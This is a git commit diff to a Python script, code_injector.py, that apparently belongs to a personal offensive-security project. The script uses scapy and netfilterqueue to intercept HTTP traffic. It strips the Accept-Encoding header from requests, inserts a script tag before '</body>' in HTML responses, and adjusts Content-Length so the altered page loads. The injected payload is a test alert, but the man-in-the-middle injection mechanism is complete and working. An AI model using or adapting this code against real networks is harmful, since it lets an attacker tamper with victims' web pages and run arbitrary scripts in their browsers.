115edc6b4a7088b8e0a11e174e07df8f6fe4ba79
jonalOW <jonalgaming@gmail.com>
2021-03-06 10:14:35 -0500

    code injection now works by changing the content-length of the site and only changing text/html content

--- Code_Injector/code_injector.py
+++ Code_Injector/code_injector.py
@@ -16,19 +16,31 @@ def set_load(packet,load):
     del packet[scapy.TCP].chksum
     return packet
 
+
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
+        load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] HTTP Request")
-            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
-            new_packet = set_load(scapy_packet, modified_load)
-            packet.set_payload(str(new_packet))
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] HTTP Respond")
-            modified_load = scapy_packet[scapy.Raw].load.replace("<head>", "<script>alert('test');</script><head>")
-            new_packet = set_load(scapy_packet, modified_load)
+            print(scapy_packet.show())
+            injection_code = "<script>alert('test');</script></body>"
+            load = load.replace("</body>", injection_code)
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)",load)
+            if content_length_search and "text/html" in load:
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length)+len(injection_code)
+                load = load.replace(content_length,str(new_content_length))
+
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet, load)
             packet.set_payload(str(new_packet))
+
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
